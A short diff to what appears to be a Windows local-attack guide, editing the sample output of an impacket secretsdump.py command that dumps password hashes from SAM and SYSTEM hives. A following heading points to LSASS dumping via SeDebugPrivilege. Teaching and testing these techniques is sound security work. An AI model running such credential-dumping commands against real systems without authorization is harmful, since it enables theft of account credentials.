@@ -295,7 +295,7 @@ Windows local attacks fall into a small number of well-known families:
     secretsdump.py -sam SAM -system SYSTEM LOCAL
 
     # Expected output:
-    # Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
+    # Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
 
 **SeDebugPrivilege -> dump LSASS:**
 
